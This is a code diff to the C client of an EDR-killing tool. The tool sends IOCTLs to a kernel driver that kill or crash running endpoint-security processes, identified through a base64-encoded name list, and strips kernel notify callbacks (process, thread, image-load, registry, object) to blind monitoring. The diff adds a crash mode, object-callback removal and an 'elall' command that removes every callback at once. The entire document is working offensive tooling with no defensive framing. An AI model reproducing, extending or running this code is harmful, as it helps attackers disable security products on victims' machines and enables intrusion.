@@ -14,6 +14,10 @@
 
 int stop_term_thread = 0;
 
+struct threadArgs {
+    HANDLE hDevice;
+    int mode;
+};
 
 // IOCTL base codes
 #define SYSTEM_DRV 0x8000
@@ -24,7 +28,7 @@ int stop_term_thread = 0;
     CTL_CODE(SYSTEM_DRV, IOCTL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // Define custom IOCTL to instruct driver to crash target process
-#define IOCTL_CRASH CTL_CODE_HIDE(1)
+#define IOCTL_KILL_PROCESS CTL_CODE_HIDE(1)
 #define IOCTL_REM_PROC_CALLBACK CTL_CODE_HIDE(2)
 #define IOCTL_LIST_PROC_CALLBACK CTL_CODE_HIDE(3)
 #define IOCTL_LIST_THREAD_CALLBACK CTL_CODE_HIDE(4)
@@ -33,6 +37,9 @@ int stop_term_thread = 0;
 #define IOCTL_REM_LOAD_IMAGE_CALLBACK CTL_CODE_HIDE(7)
 #define IOCTL_LIST_REG_CALLBACK CTL_CODE_HIDE(8)
 #define IOCTL_REM_REG_CALLBACK CTL_CODE_HIDE(9)
+#define IOCTL_REM_OBJ_CALLBACK CTL_CODE_HIDE(10)
+#define IOCTL_CRASH_PROCESS CTL_CODE_HIDE(11)
+
 
 
 #pragma warning (disable: 4996)
@@ -100,7 +107,7 @@ const char* monitoredDrivers[] = {
 BOOL Terminate(HANDLE, DWORD);
 DWORD FindProcessId(const char*);
 char* base64_decode(const char*);
-void killer_callback(HANDLE);
+void killer_callback(threadArgs* args);
 
 
 // Find PID of a process by its executable name
@@ -182,7 +189,7 @@ BOOL Terminate(HANDLE hDevice, DWORD pid) {
     DWORD bytesReturned;
     BOOL result = DeviceIoControl(
         hDevice,
-        IOCTL_CRASH,
+        IOCTL_KILL_PROCESS,
         &pid,
         sizeof(pid),
         NULL,
@@ -192,8 +199,24 @@ BOOL Terminate(HANDLE hDevice, DWORD pid) {
     return result;
 }
 
+BOOL CrashProc(HANDLE hDevice, DWORD pid) {
+    DWORD bytesReturned;
+    BOOL result = DeviceIoControl(
+        hDevice,
+        IOCTL_CRASH_PROCESS,
+        &pid,
+        sizeof(pid),
+        NULL,
+        0,
+        &bytesReturned,
+        NULL);
+    return result;
+}
+void killer_callback(threadArgs* args) {
 
-void killer_callback(HANDLE hDevice) {
+    HANDLE hDevice = args->hDevice;
+    int mode = args->mode;
+
 	int edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
 
     while (!stop_term_thread) {
@@ -204,7 +227,13 @@ void killer_callback(HANDLE hDevice) {
                 if (pid != 0) {
                     printf("Found EDR process: %s with PID %lu\n", decodedName, pid);
                     DWORD bytesReturned;
-					BOOL result = Terminate(hDevice, pid);
+                    BOOL result;
+                    if (mode == 1){
+                        result = Terminate(hDevice, pid);
+                    }
+                    if (mode == 2) {
+                        result = CrashProc(hDevice, pid);
+                    }
                     if (result) {
                         printf("Sent crash command to process %s (PID %lu)\n", decodedName, pid);
                     }
@@ -599,6 +628,30 @@ BOOL ElRegCallBack(HANDLE hDevice) {
     return result;
 }
 
+BOOL ElObjCallBack(HANDLE hDevice) {
+    DWORD bytesReturned;
+    ModulesData* resultArray = NULL;
+    ULONG64 modulesCount = 0;
+    BOOL result;
+    result = DeviceIoControl(
+        hDevice,
+        IOCTL_REM_OBJ_CALLBACK,
+        NULL,
+        0,
+        NULL,
+        0,
+        &bytesReturned,
+        NULL
+    );
+    if (!result) {
+        printf("DeviceIoControl failed. Error: %lu\n", GetLastError());
+    }
+    else {
+        printf("Successfully removed object notify routine callback.\n");
+    }
+    return result;
+}
+
 int main(int argc, char* argv[])
 {
     HANDLE hDevice = CreateFileA(
@@ -622,11 +675,25 @@ int main(int argc, char* argv[])
 		fgets(input, sizeof(input), stdin);
         if (strncmp(input, "terminate", 9) == 0) {
 			stop_term_thread = 0;
-            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, hDevice, 0, NULL);
+            threadArgs args;
+            args.hDevice = hDevice;
+            args.mode = 1;
+            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
             if (hTerminateThread == NULL) {
                 fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
                 return 1;
 			}
+        }
+        else if (strncmp(input, "crashem", 7) == 0) {
+            stop_term_thread = 0;
+            threadArgs args;
+            args.hDevice = hDevice;
+            args.mode = 2;
+            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, &args, 0, NULL);
+            if (hTerminateThread == NULL) {
+                fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
+                return 1;
+            }
         }
         else if (strncmp(input, "exit", 4) == 0) {
             printf("Exiting...\n");
@@ -650,6 +717,20 @@ int main(int argc, char* argv[])
                 printf("Failed to send crash command. Error: %lu\n", GetLastError());
             }
 		}
+        else if (strncmp(input, "crash", 5) == 0) {
+            DWORD pid = atoi(input + 6);
+            if (pid == 0) {
+                printf("Invalid PID.\n");
+                continue;
+            }
+            BOOL result = CrashProc(hDevice, pid);
+            if (result) {
+                printf("Sent crash command to process with PID %lu\n", pid);
+            }
+            else {
+                printf("Failed to send crash command. Error: %lu\n", GetLastError());
+            }
+        }
         else if (strncmp(input, "listproc", 8) == 0) {
             ListProcNotifyRoutine(hDevice);
         }
@@ -699,12 +780,23 @@ int main(int argc, char* argv[])
                 printf("Failed to send request. Error: %lu\n", GetLastError());
             }
 		}
+        else if (strncmp(input, "elobjcallback", 13) == 0) {
+            BOOL result = ElObjCallBack(hDevice);
+            if (result) {
+                printf("Sent request to eliminate object notify routine callback.\n");
+            }
+            else {
+                printf("Failed to send request. Error: %lu\n", GetLastError());
+            }
+        }
         else if (strncmp(input, "elall", 5) == 0) {
             BOOL result1 = ElProcCallback(hDevice);
             BOOL result2 = ElThreadCallback(hDevice);
             BOOL result3 = ElLoadImageCallback(hDevice);
 			BOOL result4 = ElRegCallBack(hDevice);
-            if (result1 && result2 && result3 && result4) {
+			BOOL result5 = ElObjCallBack(hDevice);
+            
+            if (result1 && result2 && result3 && result4 && result5) {
                 printf("Sent requests to eliminate all known EDR callbacks.\n");
             }
             else {
@@ -714,7 +806,9 @@ int main(int argc, char* argv[])
         else if (strncmp(input, "help", 4) == 0) {
 			printf("Help menu:\n");
 			printf(" - terminate            - Start killing EDR processes\n");
+            printf(" - crashem              - Start crashing EDR processes\n");
 			printf(" - kill <PID>           - Kill a specific process by PID\n");
+            printf(" - crash <PID>          - crash a specific process by PID\n");
 			printf(" - exit                 - Exit the program\n");
 			printf(" - stopterm             - Stop killing EDR processes\n");
             printf(" - listproc             - List process notify routines\n");
@@ -724,7 +818,8 @@ int main(int argc, char* argv[])
 			printf(" - elproccallback       - Eliminate process notify routine callback\n");
 			printf(" - elthreadcallback     - Eliminate thread notify routine callback\n");
 			printf(" - elloadimagecallback  - Eliminate load image notify routine callback\n");
-			printf(" - elregcallback        - Eliminate registry notify routine callback (not implemented)\n");
+			printf(" - elregcallback        - Eliminate registry notify routine callback\n");
+			printf(" - elobjcallback        - Eliminate object notify routine callback\n");
 
 			printf(" - elall                - Eliminate all known EDR callbacks\n");            
 			printf(" - help             - Show this help menu\n");
